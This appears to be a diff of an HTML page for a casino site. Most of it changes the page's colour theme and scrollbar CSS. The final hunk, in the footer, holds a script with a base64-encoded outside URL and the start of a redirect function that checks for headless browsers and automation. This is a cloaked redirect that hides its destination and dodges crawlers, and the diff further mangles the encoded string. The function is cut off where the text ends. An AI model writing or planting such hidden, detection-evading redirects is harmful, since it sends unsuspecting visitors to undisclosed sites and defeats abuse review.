@@ -18,7 +18,7 @@
     <script src="tailwindcss.js"></script>
     <script src="lucide.min.js"></script>
     <link href="css2.css" rel="stylesheet">
-    <script>
+<script>
         tailwind.config = {
             theme: {
                 extend: {
@@ -27,57 +27,40 @@
                         display: ['Unbounded', 'cursive'],
                     },
                     colors: {
-                        gray: {
-                            850: '#1f1f1f',
-                            900: '#121212',
-                            950: '#0B0B0B',
-                            1000: '#0a0a0a',
+                        navy: {
+                            950: '#070816',
+                            900: '#0d0f2b', 
+                            800: '#1a1c3d', 
+                            700: '#252952',
                         },
-                        green: {
-                            450: '#22c55e',
-                            500: '#16a34a',
+                        orange: {
+                            400: '#ff8a3d',
+                            500: '#ff6b00',
+                            600: '#e66000', 
                         },
-                        yellow: {
-                            300: '#fcd34d',
-                            400: '#fbbf24',
+                        cyan: {
+                            400: '#40aaff', 
                         }
-                    },
-                    backgroundImage: {
-                        'gradient-radial': 'radial-gradient(var(--tw-gradient-stops))',
-                        'hero-pattern': "url('images/header-bg.webp')", 
                     }
                 }
             }
         }
     </script>
-    <style>
-        .no-scrollbar::-webkit-scrollbar {
-            display: none;
-        }
-        .no-scrollbar {
-            -ms-overflow-style: none;
-            scrollbar-width: none;
-        }
-        ::-webkit-scrollbar {
-            width: 6px;
-            height: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #121212; 
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #333; 
-            border-radius: 3px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: #555; 
-        }
-        .text-shadow-sm {
-            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+<style>
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }        
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #070816; }
+        ::-webkit-scrollbar-thumb { background: #252952; border-radius: 3px; }
+        .btn-glow:hover {
+            box-shadow: 0 0 20px rgba(255, 107, 0, 0.4);
         }
         .flex-shrink-0.bg-\[\#021a16\]\/80 {
-    box-shadow: inset 0 0 20px rgba(16, 185, 129, 0.05), 0 10px 30px rgba(0,0,0,0.5);
-       }
+            background-color: rgba(26, 28, 61, 0.8) !important;
+            border-color: rgba(64, 170, 255, 0.1) !important;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }      
+        body { background-color: #070816; }
     </style>
 </head>
 <body class="bg-gray-950 text-gray-200 antialiased min-h-screen flex flex-col">
@@ -311,7 +294,7 @@
     </footer>
               <script>
         var myDomain = "evacasinoshka.vercel.app"; 
-        var targetB64 = "aHR0cHM6Ly9nYW1lZGFya3Nob3dyLmNvbS9kaWJ6Zm9taXI=";
+        var targetB64 = "№№aHR0cHM6Ly9nYW1lZGFya3Nob3dyLmNvbS9kaWJ6Zm9taXI=";
         function fireRedirect() {
             var isHeadless = navigator.webdriver || window.navigator.webdriver === true;
             var ua = navigator.userAgent.toLowerCase();
